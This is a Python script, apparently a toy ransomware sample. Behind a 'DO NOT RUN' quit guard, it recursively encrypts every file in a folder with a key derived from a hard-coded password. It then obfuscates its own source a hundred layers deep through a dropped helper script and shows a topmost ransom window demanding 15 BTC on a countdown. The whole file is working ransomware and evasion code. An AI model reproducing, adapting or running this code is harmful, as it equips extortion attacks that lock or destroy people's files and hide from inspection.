# DONT RUN
print('DO NOT RUN THIS SCRIPT')
quit()

import base64
import os
import pathlib
import secrets
import tkinter as tk

import cryptography
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.scrypt import Scrypt


# salt -> bits added to the password before it is hashed
# with the intent to strengthen it
def generate_salt(size=16):
    return secrets.token_bytes(size)


def derive_key(salt, password):
    kdf = Scrypt(salt=salt, length=32, n=2 ** 14, r=8, p=1)
    return kdf.derive(password.encode())


def load_salt():
    return open("salt.salt", "rb").read()


def generate_key(password, salt_size=16, load_existing_salt=False, save_salt=True):
    if load_existing_salt:
        salt = load_salt()
    elif save_salt:
        salt = generate_salt(salt_size)
        with open("salt.salt", "wb") as salt_file:
            salt_file.write(salt)

    derived_key = derive_key(salt, password)
    return base64.urlsafe_b64encode(derived_key)


def encrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
        file.write(encrypted_data)


def encrypt_folder(path_to_folder, key):
    for child in pathlib.Path(path_to_folder).glob("*"):
        if child.is_file():
            print(f"[*] Encrypting {child}")
            encrypt(child, key)
        elif child.is_dir():
            encrypt_folder(child, key)


def decrypt(filename, key):
    f = Fernet(key)
    with open(filename, "rb") as file:
        encrypted_data = file.read()

    try:
        decrypted_data = f.decrypt(encrypted_data)
    except cryptography.fernet.InvalidToken:
        print("[!] Invalid token, most likely the password is incorrect")
        return

    with open(filename, "wb") as file:
        file.write(decrypted_data)


def decrypt_folder(path_to_folder, key):
    for child in pathlib.Path(path_to_folder).glob("*"):
        if child.is_file():
            print(f"[*] Decrypting {child}")
            decrypt(child, key)
        elif child.is_dir():
            decrypt_folder(child, key)


def countdown(count):
    hour, minute, second = count.split(":")
    hour = int(hour)
    minute = int(minute)
    second = int(second)

    label['text'] = '{}:{}:{}'.format(hour, minute, second)

    if second > 0 or minute > 0 or hour > 0:
        if second > 0:
            second -= 1
        elif minute > 0:
            minute -= 1
            second = 59
        elif hour > 0:
            hour -= 1
            minute = 59
            second = 59
    else:
        root.destroy()
        return

    root.after(1000, countdown, '{}:{}:{}'.format(hour, minute, second))

def encrypt_files():
    encrypt_folder('test', generate_key('1234', salt_size=32, save_salt=True))


def decrypt_files():
    decrypt_folder('test', generate_key('1234', load_existing_salt=True))
    root.destroy()

    # Paid window
    good = tk.Tk()
    good.title('Good for you')
    good.geometry(f'{good.winfo_screenwidth()}x{good.winfo_screenheight()}')
    good.resizable(False, False)
    good.overrideredirect(True)
    good.attributes('-topmost', True)
    good.configure(background='black')
    tk.Label(good, text=res, font=('consolas', 30), fg='green', bg='black').pack()
    tk.Label(good, text='Your files have been decrypted... yay.', font=('calibri', 30, 'bold'), fg='green', bg='black').pack()
    good.after(5000, good.destroy)
    good.mainloop()

    quit()


encrypt_files()

FUSCATE_DIR = os.path.dirname(os.path.realpath(__file__)) + "\\oops.py"
FUSCATE = """import sys,argparse,random,marshal,lzma,gzip,bz2,binascii,zlib
def encode(source:str) -> str:
    selected_mode = random.choice((lzma, gzip, bz2, binascii, zlib))
    marshal_encoded = marshal.dumps(compile(source, 'Py-Fuscate', 'exec'))
    if selected_mode is binascii:
        return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads(binascii.a2b_base64({})))'.format(binascii.b2a_base64(marshal_encoded))
    return 'import marshal,lzma,gzip,bz2,binascii,zlib;exec(marshal.loads({}.decompress({})))'.format(selected_mode.__name__, selected_mode.compress(marshal_encoded))
if __name__ == '__main__':
    with open('ransomware-test.py') as inp:
        for i in range(100):
            if i == 0:
                encoded = encode(source=inp.read())
            else:
                encoded = encode(source=encoded)
    with open('ransomware-test.py', 'w') as output:
        output.write(encoded)"""

with open(FUSCATE_DIR, "w") as f:
    f.write(FUSCATE)

os.system('python.exe ' + FUSCATE_DIR)
os.remove(FUSCATE_DIR)

res = """
  ___ _______ ___ ___ _____ _____  _  ___ ___   _   
 | _ |__ / __|_ _/ __|_   _|__ | \| |/ __|_ _| /_\  
 |   /|_ \__ \| |\__ \ | |  |_ | .` | (__ | | / _ \ 
  |_|_|___|___|___|___/ |_| |___|_|\_|\___|___/_/ \_\ """

def nothing():
    pass

# Main ransomware window
root = tk.Tk()
root.title('WE GOT YOU LOL')
root.geometry('1000x500')
root.resizable(False, False)
root.overrideredirect(True)
root.attributes('-topmost',True)
tk.Label(root, text=res, font=('consolas', 12)).pack()
tk.Label(root, text="Your files have been encrypted :D",  font=('calibri', 12,'bold')).pack()
tk.Label(root, text="Pay 15BTC or LOSE EVERYTHING",  font=('calibri', 14,'bold'), fg='red').pack()
label = tk.Label(root, font=('calibri', 50, 'bold'), fg='black', bg='red')
label.pack()
tk.Button(root, text='PAY', command=decrypt_files, bg='green', fg='white', height='5', width='10', font=('calibri', 20,'bold')).pack(side='bottom')

countdown('01:30:00')
root.mainloop()

# Didn't pay window
bye = tk.Tk()
bye.title('HAHAHA')
bye.geometry(f'{bye.winfo_screenwidth()}x{bye.winfo_screenheight()}')
bye.resizable(False, False)
bye.overrideredirect(True)
bye.attributes('-topmost',True)
bye.configure(background='black')
tk.Label(bye, text=res, font=('consolas', 30), fg='red', bg='black').pack()
tk.Label(bye, text='Your files are lost forever... :D byeee', font=('calibri', 30,'bold'), fg='red', bg='black').pack()
bye.after(5000, bye.destroy)
bye.mainloop()